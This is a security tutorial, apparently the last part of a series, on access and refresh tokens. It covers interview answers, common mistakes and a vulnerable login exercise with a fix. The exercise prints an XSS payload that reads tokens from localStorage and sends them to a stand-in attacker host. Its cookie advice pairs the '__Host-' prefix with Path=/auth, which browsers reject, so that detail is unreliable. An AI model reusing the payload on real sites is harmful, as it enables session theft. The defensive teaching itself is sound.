# Access Token vs Refresh Token — Part 3 of 3

### Sections: 9 (Interview Prep), 10 (Common Developer Mistakes), 11 (Quick Revision), 12 (Security Thinking Exercise)

**Series:** Authentication & Security → Topic 04

---

## SECTION 9 — Interview Preparation

### Beginner Questions

**Q1: What is the purpose of having two tokens (access + refresh)?**

```
The two-token system solves a fundamental tension: security vs usability.

ACCESS TOKEN (short-lived):
  Purpose: lets you access APIs. Short-lived to limit damage from theft.
  Lifetime: 15 minutes.
  If stolen: attacker has 15 minutes. That's the intentional blast radius.

REFRESH TOKEN (long-lived):
  Purpose: obtain new access tokens without re-entering password.
  Lifetime: 7-30 days.
  If stolen: more serious, but detectable via rotation + replay detection.

User experience outcome:
  Users stay "logged in" for 30 days (refresh token handles silent renewal).
  They only re-enter their password after 30 days or after logout.

  But security is not sacrificed for this UX:
  Stolen access token: 15-minute window.
  Stolen refresh token: next time EITHER party tries to refresh, the system detects
  the conflict and terminates all sessions.

One-sentence summary:
  Access token = short-lived API key; refresh token = long-lived re-issue credential.
  Short to limit exposure; long to avoid user friction. Rotation + replay detection
  makes the long-lived token safe despite its duration.
```

**Q2: Why is the refresh token stored as an opaque string rather than a JWT?**

```
A JWT is self-verifiable — anyone with the public key can verify it without a DB lookup.
That's its strength for access tokens. For refresh tokens, it's a weakness.

PROBLEM WITH JWT AS REFRESH TOKEN:
  It contains claims. Anyone who captures the token can READ the claims (base64url decode).
  Worse: a JWT refresh token that contains a user ID and role is informative to attackers.

  JWT refresh token cannot be instantly revoked without a revocation list (defeats the point).
  With a JWT refresh token, you still need a DB to support revocation anyway.
  If you need a DB anyway: use an opaque token. Simpler, no claims leakage.

OPAQUE TOKEN BENEFITS:
  It's random bytes. Meaningless without the database lookup.
  Stores as SHA-256 hash in DB: even database access doesn't give you the raw token.
  Revocation: delete the DB record. Zero additional infrastructure.
  No claims leakage: capturing the token reveals nothing about the user.

Rule: JWT where stateless verification is the goal.
      Opaque token where revocability and confidentiality are the goal.
```

---

### Intermediate Questions

**Q1: A user logs out. Walk me through what happens to both tokens.**

```
Complete logout flow:

CLIENT SIDE:
  1. User clicks Logout → POST /auth/logout
  2. Browser attaches __Host-rt (refresh token) cookie automatically (path=/auth matches)
  3. Browser attaches __Host-at (access token) cookie automatically (path=/ matches)

SERVER SIDE (POST /auth/logout handler):
  4. Extract refresh token from cookie
  5. Hash the raw token: SHA-256(raw_token)
  6. Look up hash in refresh_tokens table → get token record
  7. Mark is_revoked = true, revoke_reason = 'logout' in DB (or delete the record)
  8. Clear access token cookie: Set-Cookie: __Host-at=; Max-Age=0; Path=/
  9. Clear refresh token cookie: Set-Cookie: __Host-rt=; Max-Age=0; Path=/auth

USER EXPERIENCE:
  10. Browser deletes both cookies on receipt of Max-Age=0 response
  11. Redirect to /login

WHAT ABOUT ACTIVE ACCESS TOKENS?
  The access token may still be valid for up to 15 minutes.
  This is acceptable for most applications.
  For high-security (banking, healthcare): add the access token's jti to a Redis blocklist
  → immediate revocation.
  For most apps: 15-minute zombie window is the accepted tradeoff.

SECURITY GUARANTEE:
  Refresh token: immediately dead — cannot be used to get new access tokens.
  Any request with the old refresh token after logout → DB lookup returns is_revoked=true → 401.
  Even if someone had a copy of the refresh token: useless after logout.
```

---

### Advanced Questions

**Q1: How does refresh token rotation prevent token theft from being silent and long-lasting?**

```
WITHOUT ROTATION — silent perpetual access:
  Refresh token: RT-A. Valid for 30 days. Never changes.
  Attacker steals RT-A.
  Victim uses RT-A → still valid → new access token.
  Attacker uses RT-A → still valid → new access token.
  Both work simultaneously. No conflict. No detection.
  Attacker has 30 days of silent access.

WITH ROTATION — theft becomes detectable:
  Refresh token: RT-A. Valid for 30 days.
  Every time RT-A is used → it's replaced by RT-B. RT-A is REVOKED.

  Scenario: Attacker steals RT-A BEFORE the victim uses it.
  Attacker uses RT-A → system issues RT-B (attacker now has RT-B). RT-A: REVOKED.
  Victim (who has old RT-A) tries to use it → is_revoked = true → REPLAY DETECTED.
  System: revokes RT-B immediately. All sessions in this family terminated.
  Victim: forced to log in again + receives security alert.

  Scenario: Victim uses RT-A first.
  Victim uses RT-A → system issues RT-B. RT-A: REVOKED.
  Attacker tries to use RT-A → is_revoked = true → REPLAY DETECTED.
  System: RT-B also revoked. Victim force-logged out + alert.

  KEY PROPERTY: In EITHER scenario — attack is detected within ONE refresh cycle (≤ 15 min).
  Maximum silent window: 15 minutes (until victim's next natural refresh cycle).
  Without rotation: 30 days.

  The theft is made AUDIBLE. The system cannot tell which party is the attacker,
  so it terminates all sessions and forces the legitimate user to re-authenticate
  with a cleaner session. The attacker's stolen token is dead within 15 minutes.
```

---

## SECTION 10 — Common Developer Mistakes

```
MISTAKE 1: Long-lived access tokens for "better UX"
─────────────────────────────────────────────────────
What happens: Access token set to 8h, 24h, or 7 days because users complained.
              Real fix needed: implement silent refresh interceptor.
              Wrong fix: extend access token lifetime.

Impact: stolen token → full access for 8-24 hours. 32-96× larger attack window.
Fix: keep 15-minute access token + implement Axios/fetch interceptor for silent refresh.

MISTAKE 2: No refresh token rotation
──────────────────────────────────────
What happens: Same refresh token valid for 30 days, reused indefinitely.
              Attacker steals it: 30 days of silent access, no detection.
Fix: Issue new refresh token every time the old one is used (rotate on use).

MISTAKE 3: No replay detection for rotated tokens
───────────────────────────────────────────────────
What happens: Rotation implemented but revoked tokens not checked.
              Attacker steals RT-v1. Victim rotates to RT-v2.
              Attacker uses RT-v1 → server doesn't check is_revoked → new access token issued.
Fix: Always check is_revoked status. If revoked: revoke entire family immediately.

MISTAKE 4: Refresh token stored as plain text in database
─────────────────────────────────────────────────────────
What happens: DB breach → all refresh tokens exposed.
              All users' long-lived tokens immediately usable by attacker.
Fix: Store SHA-256(token) in DB. Incoming token: hash first, lookup by hash.
     Raw token never in DB. DB breach ≠ working tokens.

MISTAKE 5: Refresh token on path=/ (not restricted)
─────────────────────────────────────────────────────
What happens: Refresh token sent with every API request (not just /auth/refresh).
              XSS-driven fetch('/api/anything') → refresh token sent along.
              Combined with CORS misconfiguration → token exfiltration possible.
Fix: Set refresh token cookie with Path=/auth only.
     Browser will NOT include the cookie in requests outside /auth/*.

MISTAKE 6: Storing refresh token in localStorage
──────────────────────────────────────────────────
What happens: Any XSS on the page → localStorage.getItem('refresh_token').
              Attacker has long-lived token. Complete account takeover for 30 days.
Fix: HttpOnly cookie for both tokens. JavaScript cannot read either.

MISTAKE 7: Logout only clears client cookie without server-side revocation
────────────────────────────────────────────────────────────────────────────
What happens: Logout handler: res.clearCookie('__Host-rt') only.
              Server-side token record still valid.
              Stolen cookie OR attacker who sniffed the refresh token:
              still works indefinitely after user "logged out."
Fix: DELETE token from DB (or mark is_revoked=true). Client cookie clear is secondary.

MISTAKE 8: Allowing access token as substitute for refresh (no path restriction)
──────────────────────────────────────────────────────────────────────────────────
What happens: /auth/refresh endpoint checks: valid JWT OR valid refresh token.
              Attacker with a stolen (not yet expired) access token can call /auth/refresh.
              Gets a fresh access token before the old one expires.
              Effectively extends access indefinitely using only the access token.
Fix: /auth/refresh must ONLY accept the refresh token. Never JWT access token.
     Strict endpoint function: refresh endpoint = refresh token only.

MISTAKE 9: Refresh token not scoped per device/client
────────────────────────────────────────────────────────
What happens: User logs in on phone and laptop.
              Both sessions share the same refresh token family.
              Revoking one session (e.g., "logout this device") kills ALL sessions.
              Or: compromised phone's token family revocation also logs out the laptop.
Fix: Each login creates its own token family (separate familyId per login event).
     Per-device revocation: delete only that family's tokens.
     Logout-all: delete all families for the user.
```

---

## SECTION 11 — Quick Revision

### 10 Core Takeaways

```
1. Access token: short (15 min), stateless JWT. Refresh token: long (30 days), DB-backed opaque token.
   These are NOT interchangeable. Different roles, different threat models.

2. Access token expiry IS the security control — never extend it for UX.
   The right fix for UX = silent refresh interceptor. Not longer tokens.

3. Refresh token must be opaque (random bytes), not JWT.
   DB lookup is the point: server controls validity. Cannot be self-validated by attacker.

4. ALWAYS store refresh tokens hashed (SHA-256) in the database.
   Plain text storage = DB breach = all users compromised simultaneously.

5. Rotate refresh tokens on every use. This makes theft detectable.
   Old token used after being rotated = replay attack = revoke entire family.

6. Refesh token cookie path: Path=/auth — NOT Path=/.
   Prevents the browser from sending it on regular API requests.
   Isolates the high-value credential to its one legitimate use.

7. Replay detection closes the theft window from 30 days to 15 minutes.
   Without it: rotation alone doesn't prevent parallel use.
   With it: theft is detected on the NEXT refresh cycle.

8. Logout = delete server-side token + clear both cookies.
   Client cookie delete alone is useless against an attacker with a stolen token copy.

9. Each login = new token family. Per-device revocation is per-family.
   Logout-all-devices = delete all families for that user.

10. Mobile apps: secure storage (iOS Keychain, Android Keystore) for refresh tokens.
    NOT AsyncStorage (React Native equivalent of localStorage — same XSS risk).
```

### 30-Second Interview Answer

> "Access and refresh tokens solve the usability-security tradeoff for JWTs. The access token is a short-lived JWT — 15 minutes — accepted by every API. Short expiry limits the damage window if stolen. The refresh token is a long-lived opaque string — 30 days — stored in the database and accepted ONLY by the /auth/refresh endpoint. When the access token expires, the client silently exchanges the refresh token for a new access token pair. The key security mechanism is refresh token rotation with replay detection: every time a refresh token is used, it's immediately revoked and replaced with a new one. If a stolen token is replayed, the system detects the conflict — two parties trying to use tokens from the same family — and revokes the entire chain. This makes theft detectable within one 15-minute refresh cycle instead of giving an attacker a silent 30-day window."

### Memory Tricks

```
Two-token roles — "SHORT buys TIME, LONG buys DETECTION":
  Short access token = buys TIME security (limits theft window)
  Long refresh token with rotation = buys DETECTION (theft becomes visible)

Refresh token rules — "HOPR":
  H — Hash it in the database (never plain text)
  O — Opaque format (not JWT — no claims readable)
  P — Path-restricted cookie (Path=/auth — not Path=/)
  R — Rotate on use + Replay detection for family revocation

Token pair theft scenarios — "BOTH BAD":
  Access token stolen only → 15 min window, accept it
  Refresh token stolen → detectable within 15 min via rotation conflict
  BOTH stolen → same detection applies on next rotation
```

---

## SECTION 12 — Security Thinking Exercise

### Scenario: CodeCollab — Developer Collaboration Tool

**Context:**

CodeCollab is a GitHub-like platform for enterprise teams. Users have repositories, personal data, and private code. The frontend is a React SPA.

**Current token implementation:**

```javascript
// Login
async function login(email, password) {
  const response = await fetch("/auth/login", {
    method: "POST",
    body: JSON.stringify({ email, password }),
  });
  const data = await response.json();

  // Store tokens
  localStorage.setItem("access_token", data.accessToken); // 7-day JWT
  localStorage.setItem("refresh_token", data.refreshToken); // Opaque, 90-day, no rotation

  return data;
}

// API calls
async function apiCall(path) {
  const token = localStorage.getItem("access_token");
  return fetch(path, {
    headers: { Authorization: `Bearer ${token}` },
  });
}

// Refresh
async function refreshAccessToken() {
  const rt = localStorage.getItem("refresh_token");
  const response = await fetch("/auth/refresh", {
    method: "POST",
    body: JSON.stringify({ refresh_token: rt }),
  });
  const data = await response.json();
  localStorage.setItem("access_token", data.accessToken);
}

// Logout
async function logout() {
  localStorage.removeItem("access_token");
  localStorage.removeItem("refresh_token");
  window.location.href = "/login";
}
```

**Identify all security vulnerabilities and describe the complete attack scenario.**

---

### Analysis: Four Cascading Failures

```
VULNERABILITY 1 — Both tokens in localStorage

  Any JavaScript on the page can read localStorage.
  CodeCollab renders: user-uploaded README files, profile descriptions,
  repository descriptions (markdown). Each is a potential XSS surface.

  Attack: Researcher finds XSS in README markdown rendering (common in GitHub clones).
  Payload in README.md:
    <script>
      const at = localStorage.getItem('access_token');
      const rt = localStorage.getItem('refresh_token');
      fetch('https://evil.io/harvest', { method:'POST',
        body: JSON.stringify({at, rt}), mode:'no-cors' });
    </script>
  Result: Any user viewing this repository loses BOTH tokens instantly.

VULNERABILITY 2 — 7-day access token

  Access token captured at 9:00 AM Monday.
  Still valid at 9:00 AM the following Monday.
  Attacker has 7 DAYS of full API access: read code, export repos, read private issues.

VULNERABILITY 3 — 90-day refresh token with no rotation

  Refresh token captured with the access token.
  No rotation: attacker and victim can both use the same refresh token.
  Victim logs out → logout() only clears localStorage → server-side token LIVES.
  Server never told about the logout.

  Timeline:
    User: "I noticed something weird. Changed password. Logged out."
    Attacker: still has 90-day refresh token in their possession.
    Next day: attacker refreshes → new 7-day access token.
    → access maintained for 90 DAYS after the user thinks they're safe.

VULNERABILITY 4 — Logout is client-side only

  logout() removes localStorage items. That's it.
  No /auth/logout API call. No server-side deletion.
  Physical consequence: ANY copy of the token (attacker's server logs) = 90 days of access.
```

### Correct Secure Implementation

```javascript
// FIXED: tokens in HttpOnly cookies — server sets them
// Client code has NO access to token values at all

async function login(email, password) {
  const response = await fetch("/auth/login", {
    method: "POST",
    credentials: "include", // Include cookies in cross-origin requests if needed
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ email, password }),
  });

  if (!response.ok) throw new Error("Login failed");

  // Server sets cookies via Set-Cookie headers:
  // __Host-cc_at: access_token  (HttpOnly, Secure, SameSite=Lax, Path=/, Max-Age=900)
  // __Host-cc_rt: refresh_token (HttpOnly, Secure, SameSite=Lax, Path=/auth, Max-Age=2592000)

  const user = await response.json(); // Only user profile, NO token values
  return user;
}

async function apiCall(path, options = {}) {
  // credentials: 'include' → sends cookies automatically
  // No manual Authorization header needed — cookie is attached by browser
  const response = await fetch(path, {
    ...options,
    credentials: "include",
  });

  if (response.status === 401) {
    // Try silent refresh
    const refreshed = await silentRefresh();
    if (refreshed) {
      return fetch(path, { ...options, credentials: "include" });
    }
    window.location.href = "/login";
  }

  return response;
}

async function silentRefresh() {
  try {
    const response = await fetch("/auth/refresh", {
      method: "POST",
      credentials: "include", // __Host-cc_rt cookie (Path=/auth) auto-attached
    });
    return response.ok;
  } catch {
    return false;
  }
}

async function logout() {
  await fetch("/auth/logout", {
    method: "POST",
    credentials: "include", // Server deletes both tokens from DB
  });
  // Server responds with Set-Cookie: Max-Age=0 for both cookies
  // Browser deletes them. No localStorage to clear.
  window.location.href = "/login";
}

// SUMMARY OF CHANGES:
// Access token: 7 days → 15 minutes (correct lifetime)
// Refresh token: 90 days/no rotation → 30 days/rotation+replay detection
// Storage: localStorage → HttpOnly cookies (JS cannot read them)
// Logout: client-only → server-side DB deletion + cookie clear
// XSS: now cannot read tokens (HttpOnly) → can still send requests but cannot exfiltrate
```

_End of Topic 04: Access Token vs Refresh Token_
